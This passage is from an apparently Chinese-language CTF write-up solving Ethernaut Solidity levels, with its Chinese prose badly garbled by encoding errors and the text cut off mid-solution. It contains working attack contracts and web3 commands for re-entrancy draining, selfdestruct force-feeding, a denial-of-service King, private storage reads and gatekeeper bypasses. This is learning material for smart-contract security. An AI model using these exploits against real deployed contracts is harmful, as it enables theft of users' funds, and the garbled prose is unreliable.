‰ΩÜÊòØ‰πüÂπ∂ÈùûÊ≤°ÊúâÂäûÊ≥ïÊù•Â§ÑÁêÜËØ•ÈóÆÈ¢òÔºåÊúÄÁÆÄÂçïÁöÑÂ§ÑÁêÜÊòØÂú®ÊØè‰∏ÄÊ¨°Êï∞Â≠¶ËøêÁÆóÊó∂ËøõË°åÂà§Êñ≠ÔºåÂ¶Ç a=a+b ÔºõÂ∞±ÂèØ‰ª•ÂÜôÊàê if(a+b&gt;a) a=a+b; „ÄÇÈ¢òÁõÆÂª∫ËÆÆÁöÑÂè¶‰∏ÄÁßçËß£ÂÜ≥ÊñπÊ°àÂàôÊòØ‰ΩøÁî® OpenZeppelinÂõ¢Èòü ÂºÄÂèëÁöÑ SafeMathÂ∫ì ÔºåÂ¶ÇÊûúÊï¥Êï∞Ê∫¢Âá∫ÊºèÊ¥ûÂèëÁîüÊó∂ÔºåÂáΩÊï∞Â∞ÜËøõË°åÂõûÈÄÄÊìç‰ΩúÔºåÊ≠§Êó∂Âä†Ê≥ïÊìç‰ΩúÂèØ‰ª•ÂÜô‰ΩúËøôÊ†∑Ôºöa=a.add(b); DelegationRequire claim ownership of the instance Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; if(delegate.delegatecall(msg.data)) &#123; this; &#125; &#125;&#125; Analyse Êàë‰ª¨Áúã‰∏ã delegatecall ÁöÑÊñáÊ°£ There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values. ËÄÉÁÇπ‰∏Ä ËÄÉÁÇπ‰∏ÄÂú®‰∫é Solidity ÊîØÊåÅ‰∏§ÁßçÂ∫ïÂ±ÇË∞ÉÁî®ÊñπÂºè call Âíå delegatecall call Â§ñÈÉ®Ë∞ÉÁî®Êó∂Ôºå‰∏ä‰∏ãÊñáÊòØÂ§ñÈÉ®ÂêàÁ∫¶ delegatecall Â§ñÈÉ®Ë∞ÉÁî®Êó∂Ôºå‰∏ä‰∏ãÊñáÊòØË∞ÉÁî®ÂêàÁ∫¶ ÊâÄ‰ª• delegate.delegatecall(msg.data) ÂÖ∂ÂÆûË∞ÉÁî®ÁöÑÊòØ delegate Ëá™Ë∫´ÁöÑ msg.data ËÄÉÁÇπ‰∫å ÁÜüÊÇâ raw Ê†ºÂºèÁöÑ‰∫§ÊòìÁöÑ data ÁöÑ‰ºöÁü•ÈÅìÔºödata Â§¥4‰∏™ byte ÊòØË¢´Ë∞ÉÁî®ÊñπÊ≥ïÁöÑÁ≠æÂêçÂìàÂ∏åÔºåÂç≥ bytes4(keccak256(&quot;func&quot;)) , remix ÈáåË∞ÉÁî®ÂáΩÊï∞ÔºåÂÆûÈôÖÊòØÂêëÂêàÁ∫¶Ë¥¶Êà∑Âú∞ÂùÄÂèëÈÄÅ‰∫Ü( msg.data[0:4] == ÂáΩÊï∞Á≠æÂêçÂìàÂ∏å )ÁöÑ‰∏ÄÁ¨î‰∫§Êòì ÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË∞ÉÁî® Delegation ÁöÑ fallback ÁöÑÂêåÊó∂Âú® msg.data ÊîæÂÖ• pwn ÂáΩÊï∞ÁöÑÁ≠æÂêçÂç≥ÂèØ ËÄÉÁÇπ‰∏â ËøôÈáåÂÖ∂ÂÆû‰∏ªË¶ÅÊÄùË∑ØÂ∞±ÊòØ fallback ÁöÑËß¶ÂèëÊù°‰ª∂Ôºö ‰∏ÄÊòØÂ¶ÇÊûúÂêàÁ∫¶Âú®Ë¢´Ë∞ÉÁî®ÁöÑÊó∂ÂÄôÔºåÊâæ‰∏çÂà∞ÂØπÊñπË∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåÂ∞±‰ºöËá™Âä®Ë∞ÉÁî® fallback ÂáΩÊï∞ ‰∫åÊòØÂè™Ë¶ÅÊòØÂêàÁ∫¶Êî∂Âà∞Âà´‰∫∫ÂèëÈÄÅÁöÑ Ether ‰∏îÊ≤°ÊúâÊï∞ÊçÆÔºåÂ∞±‰ºöÂ∞ùËØïÊâßË°å fallback ÂáΩÊï∞ÔºåÊ≠§Êó∂ fallback ÈúÄË¶ÅÂ∏¶Êúâ payable Ê†áËÆ∞ÔºåÂê¶ÂàôÔºåÂêàÁ∫¶Â∞±‰ºöÊãíÁªùËøô‰∏™ Ether Áªº‰∏äÔºåÊàë‰ª¨Âè™ÈúÄË∞ÉÁî® Delegation ÁöÑ ÂÅápwn() Âç≥ÂèØÔºåËøôÊ†∑Â∞±‰ºöËß¶Âèë Delegation ÁöÑ fallback ÔºåËøôÊ†∑ pwn ÁöÑÂáΩÊï∞Á≠æÂêçÂìàÂ∏åÂ∞±‰ºöÊîæÂú® msg.data[0:4] ‰∫ÜÔºåËøôÊ†∑Â∞±‰ºöÂè™ÈúÄ delegate ÁöÑ pwn() Êää owner ÂèòÊàêËá™Â∑± Solution web3 ‰∏≠ sha3 Â∞±ÊòØ keccak256 ForceRequire make the balance of the contract greater than zero Source1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =√∏= / (______)__m_m)*/&#125; Analyse È™öÊìç‰ΩúÔºå selfdestruct Ëá™ÊØÅÂêàÁ∫¶Âº∫ËΩ¨ ÊâÄ‰ª•Âè™ÈúÄË¶ÅÂÜçÈÉ®ÁΩ≤‰∏Ä‰∏™ÂêàÁ∫¶ÔºåÊâì‰∏ÄÁÇπÈí±ÔºåÁÑ∂ÂêéËá™ÊØÅÊääÂêàÁ∫¶ÈáëÈ¢ùËΩ¨ÁªôÁõÆÊ†áÂêàÁ∫¶Âç≥ÂèØ Solution1234567891011121314pragma solidity ^0.4.18; contract Force &#123;&#125;contract hack &#123; address instance_address = 0xe0a165650f7b04bde4fda5845d41aaf947703dd2; Force target = Force(instance_address); function hack() payable &#123;&#125; function exploit() payable public &#123; selfdestruct(target); &#125;&#125; ÈÉ®ÁΩ≤ hack ÁöÑÊó∂ÂÄôËΩ¨‰∏ÄÁÇπÈí±ÔºåÁÑ∂ÂêéÊâßË°å exploit() Âç≥ÂèØ VaultRequire Unlock the vault to pass the level! Source1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; Analyse ÈÄöÂÖ≥Êù°‰ª∂ÊòØ locked = false ËÄÉÁÇπÂÖ≥ÈîÆÊòØÂå∫ÂùóÈìæ‰∏äÁöÑÊâÄÊúâ‰ø°ÊÅØÊòØÂÖ¨ÂºÄÁöÑ ÂèØ‰ª•Áî® web3 ÁöÑ getStorageAt Êù•ËÆøÈóÆÂêàÁ∫¶ÈáåÂèòÈáèÁöÑÂÄº Solution KingRequire When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation. Source123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; Analyse ‰ª£Á†ÅÈÄªËæëÂæàÁÆÄÂçïÔºåË∞ÅÁªôÁöÑÈí±Â§öË∞ÅÂ∞±ËÉΩÊàê‰∏∫ King ÔºåÂπ∂‰∏îÂ∞ÜÂâç‰ªª King ÁöÑÈí±ÂΩíËøò„ÄÇÂΩìÊèê‰∫§ instance Êó∂ÔºåÈ¢òÁõÆ‰ºöÈáçÊñ∞Â§∫Âõû King ÁöÑ‰ΩçÁΩÆÔºåÈúÄË¶ÅÈòªÊ≠¢ÂÖ∂‰ªñ‰∫∫Êàê‰∏∫ KingÊñπÂèØÈÄöÂÖ≥ È¶ñÂÖàÁúã‰∏Ä‰∏ã Solidity ‰∏≠Âá†ÁßçËΩ¨Ë¥¶ÊñπÂºèÔºö address.transfer()ÂΩìÂèëÈÄÅÂ§±Ë¥•Êó∂‰ºö throw ÔºõÂõûÊªöÁä∂ÊÄÅÂè™‰ºö‰º†ÈÄíÈÉ®ÂàÜ Gas ‰æõË∞ÉÁî®ÔºåÈò≤Ê≠¢ÈáçÂÖ• address.send()ÂΩìÂèëÈÄÅÂ§±Ë¥•Êó∂‰ºöËøîÂõû falseÂè™‰ºö‰º†ÈÄíÈÉ®ÂàÜ Gas ‰æõË∞ÉÁî®ÔºåÈò≤Ê≠¢ÈáçÂÖ• address.call.value()()ÂΩìÂèëÈÄÅÂ§±Ë¥•Êó∂‰ºöËøîÂõû false‰º†ÈÄíÊâÄÊúâÂèØÁî® Gas ‰æõË∞ÉÁî®Ôºå‰∏çËÉΩÊúâÊïàÈò≤Ê≠¢ÈáçÂÖ• ÂõûÂ§¥Áúã‰∏ã‰ª£Á†ÅÔºåÂΩìÊàë‰ª¨Êàê‰∏∫ King ÂêéÔºåÂ¶ÇÊûúÊúâ‰∫∫Âá∫‰ª∑ÊØîÊàë‰ª¨È´òÔºå‰ºöÈ¶ñÂÖàÊääÈí±ÈÄÄÂõûÁªôÊàë‰ª¨Ôºå‰ΩøÁî®ÁöÑÊòØ transfer Ôºå‰∏äÈù¢ÊèêÂà∞ÂΩì transfer Ë∞ÉÁî®Â§±Ë¥•Êó∂‰ºöÂõûÊªöÁä∂ÊÄÅÔºåÈÇ£‰πàÂ¶ÇÊûúÂêàÁ∫¶Âú®ÈÄÄÈí±Ëøô‰∏ÄÊ≠•È™§‰∏ÄÁõ¥Ë∞ÉÁî®Â§±Ë¥•ÁöÑËØùÔºåÈÇ£‰πà‰ª£Á†ÅÂ∞ÜÊó†Ê≥ïÁªßÁª≠Âêë‰∏ãËøêË°åÔºåÂÖ∂‰ªñ‰∫∫‰πüÂ∞±Êó†Ê≥ïÊàê‰∏∫Êñ∞ÁöÑ KingÔºåËææÂà∞ÊîªÂáªÊïàÊûú Solution È¶ñÂÖàÊü•Áúã‰∏Ä‰∏ãÂΩìÂâçÊúÄÈ´òÂá∫‰ª∑ 12await fromWei((await contract.prize()).toNumber())// 1 eth ÈÉ®ÁΩ≤‰∏Ä‰∏™Êñ∞ÁöÑÂêàÁ∫¶ÔºåÂΩìÊî∂Âà∞ËΩ¨Ë¥¶Êó∂‰∏ªÂä®ÊäõÂá∫ÈîôËØØ 123456789101112131415pragma solidity ^0.4.18;contract Attack &#123; address instance_address = 0xa4d38a8591b7e16bea4fe0f64cd77ee7243f1cdc; function Attack() payable&#123;&#125; function hack() public &#123; instance_address.call.value(1.1 ether)(); &#125; function () public &#123; throw; &#125;&#125; Ë∞ÉÁî® hack() Âç≥ÂèØÔºåÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî® hack() ÂêéÊàê‰∏∫‰∫ÜÊñ∞ÁöÑ King ÔºåËÄå‰∏î Submit innstance ÂêéÔºå‰ªçÁÑ∂ÊòØ King Re-entrancyRequire The goal of this level is for you to steal all the funds from the contract Source12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125; Analyse DASP ÊéíÁ¨¨‰∏ÄÁöÑÈáçÂÖ•ÊºèÊ¥ûÔºå‰πüÊòØËëóÂêçÁöÑ DAO ‰∫ã‰ª∂ÈáåÁî®Âà∞ÁöÑÊñπÊ≥ï ÊºèÊ¥û‰∏ªË¶ÅÂú®‰∫é withdraw() ÂáΩÊï∞ÔºåÂêàÁ∫¶Âú®ËøõË°åÊèêÂ∏ÅÊó∂Ôºå‰ΩøÁî® require ‰æùÊ¨°Âà§Êñ≠ÊèêÂ∏ÅË¥¶Êà∑ÊòØÂê¶Êã•ÊúâÁõ∏Â∫îÁöÑËµÑ‰∫ßÔºåÈöèÂêé‰ΩøÁî® msg.sender.call.value(amount) Êù•ÂèëÈÄÅ Ether ÔºåÂ§ÑÁêÜÂÆåÊàêÂêéÁõ∏Â∫î‰øÆÊîπÁî®Êà∑ËµÑ‰∫ßÊï∞ÊçÆ Âú®ÊèêÂ∏ÅÁöÑËøáÁ®ã‰∏≠ÔºåÂ≠òÂú®‰∏Ä‰∏™ÈÄíÂΩí withdraw ÁöÑÈóÆÈ¢òÔºàÂõ†‰∏∫ -=_amount Âú®ËΩ¨Ë¥¶‰πãÂêéÔºâÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÉ®ÁΩ≤‰∏Ä‰∏™ÂåÖÂê´ÊÅ∂ÊÑèÈÄíÂΩíË∞ÉÁî®ÁöÑÂêàÁ∫¶Â∞ÜÂÖ¨ÂÖ±Èí±ÂåÖÂêàÁ∫¶ÈáåÁöÑ Ether ÂÖ®ÈÉ®ÊèêÂá∫ ÂÖ∂‰∏≠ÔºåËΩ¨Ë¥¶‰ΩøÁî®ÁöÑÊòØ address.call.value()() ÂáΩÊï∞Ôºå‰º†ÈÄí‰∫ÜÊâÄÊúâÂèØÁî® gas ‰æõË∞ÉÁî®ÔºåÊòØÂèØ‰ª•ÊàêÂäüÊâßË°åÈÄíÂΩíÁöÑÂâçÊèêÊù°‰ª∂ Solution Êü•ÁúãÈ¢òÁõÆË¥¶Êà∑‰ΩôÈ¢ù‰ø°ÊÅØÔºö Reentrance ÂêàÁ∫¶‰ΩôÈ¢ù‰∏∫ 1 eth balances[address(Attacker)] = 0 ÊâÄ‰ª•ÈÉ®ÁΩ≤ Attacker ÂêàÁ∫¶Êó∂ÔºåÂèØ‰ª•Áªô Attacker ÂêàÁ∫¶ÂÖàËΩ¨ 1 eth ÔºåÁÑ∂Âêé donate 1 eth ÔºåËøôÊ†∑ÁöÑËØù Reentrance ÂêàÁ∫¶‰ΩôÈ¢ùÂ∞±ÊòØ 2 eth ‰∫ÜÔºåbalances[address(Attacker)] Â∞±ÊòØ 1 eth ÔºåÁÑ∂ÂêéÊØèÊ¨° withdraw 1 ethÔºåËøôÊ†∑ÁöÑËØùÔºåÈáçÂÖ• 2 Ê¨°Â∞±ËÉΩÂ∞ÜÈí±ÂÖ®ÈÉ®ËΩ¨Âá∫ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960pragma solidity ^0.4.19;contract Reentrance &#123; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract Attacker&#123; address instance_address = 0x54426463ef0ff0c720e9947f79ab6a770fda34f4; Reentrance target = Reentrance(instance_address); uint have_withdraw = 0; function Attacker() payable &#123;&#125; function get_balance() public view returns (uint)&#123; return target.balanceOf(this); &#125; function get_balance_ins() public view returns (uint)&#123; return instance_address.balance; &#125; function get_balance_my() public view returns (uint)&#123; return address(this).balance; &#125; function donate() public payable&#123; target.donate.value(1 ether)(this); &#125; function() payable&#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(1 ether); &#125; &#125; function hack()&#123; target.withdraw(1 ether); &#125;&#125; ÂêàÁ∫¶ÂàöÈÉ®ÁΩ≤Â•Ω‰ΩôÈ¢ùÂ¶Ç‰∏ã Ë∞ÉÁî® Attacker ÁöÑ donate() Ë∞ÉÁî® hack() ËøõË°åÈáçÂÖ•ÊîªÂáª 2 Ê¨°ÔºåÂèØ‰ª•ÁúãÂà∞ Reentrance ÂêàÁ∫¶‰ΩôÈ¢ùÂèò‰∏∫ 0 ÔºåËÄå balances[address(Attacker)] = 1 - 2 ÔºåÁî±‰∫éÊòØ uint256 Á±ªÂûãÔºåÊâÄ‰ª•‰∏ãÊ∫¢ÂèòÊàê‰∫Ü uint256 Á±ªÂûãÊúÄÂ§ßÂÄºÔºåÊîªÂáªÊàêÂäü ElevatorRequire reach the top of your building Source123456789101112131415161718192021pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; Analyse ÈÄöÂÖ≥Êù°‰ª∂ÊòØ‰Ωø contract.top = true Building Êé•Âè£‰∏≠Â£∞Êòé‰∫Ü isLastFloor ÂáΩÊï∞ÔºåÁî®Êà∑ÂèØËá™Ë°åÁºñÂÜô Âú®‰∏ªÂêàÁ∫¶‰∏≠ÔºåÂÖàË∞ÉÁî® building.isLastFloor(floor) ËøõË°å if Âà§Êñ≠ÔºåÁÑ∂ÂêéÂ∞Ü building.isLastFloor(floor) ËµãÂÄºÁªô top „ÄÇË¶Å‰Ωø top = ture ÔºåÂàô building.isLastFloor(floor) Á¨¨‰∏ÄÊ¨°Ë∞ÉÁî®ÈúÄËøîÂõû false ÔºåÁ¨¨‰∫åÊ¨°Ë∞ÉÁî®ËøîÂõû true ÊâÄ‰ª•Â∞±Êúâ‰∫ÜÊÄùË∑ØÔºöËÆæÁΩÆ‰∏Ä‰∏™ÂàùÂßãÂÄº‰∏∫ true ÁöÑÂèòÈáèÔºåÊØèÊ¨°Ë∞ÉÁî® isLastFloor() Êó∂ÔºåÂ∞ÜÂÖ∂ÂèñÂèçÂÜçËøîÂõû ‰ΩÜÊòØÔºåÈ¢òÁõÆÂú®Â£∞Êòé isLastFloor Êó∂ÔºåËµã‰∫à‰∫Ü view Â±ûÊÄßÔºåview Ë°®Á§∫ÂáΩÊï∞‰ºöËØªÂèñÂêàÁ∫¶ÂèòÈáèÔºå‰ΩÜÊòØ‰∏ç‰ºö‰øÆÊîπ‰ªª‰ΩïÂêàÁ∫¶ÁöÑÁä∂ÊÄÅ Áúã‰∫Ü‰∏ãÈ¢òÁõÆÁöÑÊèêÁ§∫Sometimes solidity is not good at keeping promises. ÁøªÈòÖ‰∫ÜÊñáÊ°£ÔºåÊâæÂà∞ÂØπ view ÁöÑÊèèËø∞Ôºöview functions: The compiler does not enforce yet that a view method is not modifying state. ÊÑèÊÄùÊòØÂΩìÂâç Solidity ÁºñËØëÂô®Ê≤°ÊúâÂº∫Âà∂ÊâßË°å view ÂáΩÊï∞‰∏çËÉΩ‰øÆÊîπÁä∂ÊÄÅÔºåÊâÄ‰ª•‰∏äËø∞ÂÅöÊ≥ïÂ∞±ÊòØÂèØË°åÁöÑ1234567891011121314151617181920212223242526272829303132pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract hack &#123; address instance_address = 0x89fa2727ad30129f657994117323f7e15b3c626a; Elevator e = Elevator(instance_address); bool public flag = true; function isLastFloor(uint) public returns (bool)&#123; flag = !flag; return flag; &#125; function exploit() public&#123; e.goTo(123); &#125;&#125; Ë∞ÉÁî® exploit() Âç≥ÂèØ PrivacyRequire Unlock this contract to beat the level Source123456789101112131415161718192021222324252627282930pragma solidity ^0.4.18;contract Privacy &#123; bool public locked = true; uint256 public constant ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; function Privacy(bytes32[3] _data) public &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */&#125; Analyse ‰πãÂâç Vault È¢òÁõÆÁöÑÂçáÁ∫ßÁâàÔºåËøòÊòØ‰∏ÄÊ†∑ÔºåÁî® getStorageAt() ÊääÈìæ‰∏äÁöÑÊï∞ÊçÆËØªÂá∫Êù• Solution12345678910await web3.eth.getStorageAt(instance, 0, function(x,y)&#123;console.info(y);&#125;)// 0x000000000000000000000000000000000000000000000000000000df9dff0a01await web3.eth.getStorageAt(instance, 1, function(x,y)&#123;console.info(y);&#125;)// 0x85b05e35e73af32ed1948f0a1a58d8a67e449f77eb22222decfef426f1936586await web3.eth.getStorageAt(instance, 2, function(x,y)&#123;console.info(y);&#125;)// 0x9daa83d6f3dbb320583dc59ed67813a5adc473d0d2ff18c0be08ef1a46a037b0await web3.eth.getStorageAt(instance, 3, function(x,y)&#123;console.info(y);&#125;)// 0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697await web3.eth.getStorageAt(instance, 4, function(x,y)&#123;console.info(y);&#125;)// 0x0000000000000000000000000000000000000000000000000000000000000000 ÂèØ‰ª•ÁúãÂà∞ÔºåÊØè‰∏Ä‰∏™Â≠òÂÇ®‰ΩçÊòØ 32 ‰∏™Â≠óËäÇ„ÄÇÊ†πÊçÆ Solidity ‰ºòÂåñËßÑÂàôÔºåÂΩìÂèòÈáèÊâÄÂç†Á©∫Èó¥Â∞è‰∫é 32 Â≠óËäÇÊó∂Ôºå‰ºö‰∏éÂêéÈù¢ÁöÑÂèòÈáèÂÖ±‰∫´Á©∫Èó¥ÔºåÂ¶ÇÊûúÂä†‰∏äÂêéÈù¢ÁöÑÂèòÈáè‰πü‰∏çË∂ÖËøá 32 Â≠óËäÇÁöÑËØùÔºåÈô§Âéª ID Â∏∏ÈáèÊó†ÈúÄÂ≠òÂÇ®Ôºö bool public locked = true Âç† 1 Â≠óËäÇ -&gt; 01 uint8 private flattening = 10 Âç† 1 Â≠óËäÇ -&gt; 0a uint8 private denomination = 255 Âç† 1 Â≠óËäÇ -&gt; ff uint16 private awkwardness = uint16(now) Âç† 2 Â≠óËäÇ -&gt; df9d ÂàöÂ•ΩÂØπÂ∫î‰∫ÜÁ¨¨‰∏Ä‰∏™Â≠òÂÇ®‰ΩçÁöÑ df9dff0a0a ÊâÄ‰ª• data[2] Â∫îËØ•Âú®Á¨¨Âõõ‰∏™Â≠òÂÇ®‰Ωç 0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697 Gatekeeper OneRequire Make it past the gatekeeper and register as an entrant to pass this level. Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract GatekeeperOne &#123; using SafeMath for uint256; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas.mod(8191) == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; Analyse Êª°Ë∂≥‰∏â‰∏™ modifier Êù°‰ª∂Âç≥ÂèØ gateOne ÂæàÁÆÄÂçïÔºåÈÄöËøáÁ¨¨‰∏âÊñπÂêàÁ∫¶Ë∞ÉÁî® enter Âç≥ÂèØ gateTwo ÈúÄË¶ÅÊª°Ë∂≥ msg.gas % 8191 == 0 msg.gas ÊòØ remaining gas ÔºåÂú® remix ÁöÑ Javascript VM ÁéØÂ¢É‰∏ãËøõË°å DebugÔºå Âú® Step detail ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™ÂèòÈáèÔºåÂÅáËÆæÂú®ËøõÂÖ• enter ‰πãÂâçÁöÑ remaining gas = 81910 Ë∞ÉËØïÂà∞ gateTwo ÁöÑ msg.gas Âú∞ÊñπÔºåÊ≠§Êó∂ remaining gas = 81697 ÈÇ£‰πàËøô‰∏™ËøáÁ®ãÈó¥Ê∂àËÄóÁöÑ gas = 81910 - 81697ÔºåÂä†‰∏ä gas Êú¨Ë∫´Ê∂àËÄóÁöÑ 2 Âç≥ÂèØÔºåÊâÄ‰ª•‰∏∫‰∫ÜÊª°Ë∂≥ gateTwoÔºåÂú®ËøõÂÖ• enter ‰πãÂâçÁöÑ gas ÂèØ‰ª•ËÆæÁΩÆ‰∏∫ 81910-91697+81910+2 gateThree ‰πüÊØîËæÉÁÆÄÂçïÔºåÊúÄÂêéÁöÑÈÄªËæëÊòØÂ∞Ü tx.origin ÂÄíÊï∞‰∏âÂõõÂ≠óËäÇÊç¢Êàê 0000 Âç≥ÂèØÔºåÂèØ‰ª•ÈÄöËøá bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF ÂÆûÁé∞ Solution1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.18; contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; contract MyAgent &#123; GatekeeperOne c; function MyAgent(address _c) &#123; c = GatekeeperOne(_c); &#125; function exploit() &#123; bytes8 _gateKey = bytes8(msg.sender) &amp; 0xffffffff0000ffff; c.enter.gas(81910-81697+81910+2)(_gateKey); &#125;&#125; Ë∞ÉÁî® exploit() Âç≥ÂèØ Gatekeeper TwoRequire Register as an entrant to pass this level Source12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; Analyse Êª°Ë∂≥‰∏â‰∏™ modifier Âç≥ÂèØ gateOne ÂæàÁÆÄÂçïÔºåÈÄöËøáÁ¨¨‰∏âÊñπÂêàÁ∫¶Ë∞ÉÁî® enter Âç≥ÂèØ gateThree ÊØïÁ´üÁÆÄÂçïÔºåÁõ¥Êé•ÂºÇÊàñÈÄÜËøêÁÆó _gateKey = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1)) gateTwo ÊØîËæÉÊúâÊäÄÂ∑ßÊÄßÔºåÁî®‰∫Ü ÂÜÖËÅîÊ±áÁºñ ÁöÑÂÜôÊ≥ïÔºåÁøª‰∫Ü‰∏Ä‰∏ãÊñáÊ°£ https://ethereum.github.io/yellowpaper/paper.pdf Ôºö caller : Get caller address. extcodesize : Get size of an account‚Äôs code. ÊåâÁÖßÈ¢òÁõÆÁöÑÊÑèÊÄùÔºåË¶Å‰ΩøÂΩìÂâçÂêàÁ∫¶‰ª£Á†ÅÂå∫‰∏∫Á©∫ÔºåÊòæÁÑ∂‰∏éËß£È¢òÊòØÁüõÁõæÁöÑÔºå‰ªîÁªÜËØªÊñáÊ°£ÔºåÊúâ‰∏Ä‰∫õÁªÜËäÇ Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.‚Ä¶‚Ä¶During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code. ‰πüÂ∞±ÊòØËØ¥ÔºåÂú®ÊâßË°åÂàùÂßãÂåñ‰ª£Á†ÅÔºàÊûÑÈÄ†ÂáΩÊï∞ÔºâÔºåËÄåÊñ∞ÁöÑÂå∫ÂùóËøòÊú™Ê∑ªÂä†Âà∞Èìæ‰∏äÁöÑÊó∂ÂÄôÔºåÊñ∞ÁöÑÂú∞ÂùÄÂ∑≤ÁªèÁîüÊàêÔºåÁÑ∂ËÄå‰ª£Á†ÅÂå∫‰∏∫Á©∫ÔºåÊ≠§Êó∂ÔºåË∞ÉÁî® EXTCODESIZE() ËøîÂõû‰∏∫ 0 ÈÇ£‰πàÔºåÂè™ÈúÄË¶ÅÂú®Á¨¨‰∏âÊñπÂêàÁ∫¶ÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏≠Ë∞ÉÁî®È¢òÁõÆÂêàÁ∫¶‰∏≠ÁöÑ enter() Âç≥ÂèØ Solution12345678910111213141516171819202122232425262728293031323334353637pragma solidity ^0.4.18;contract 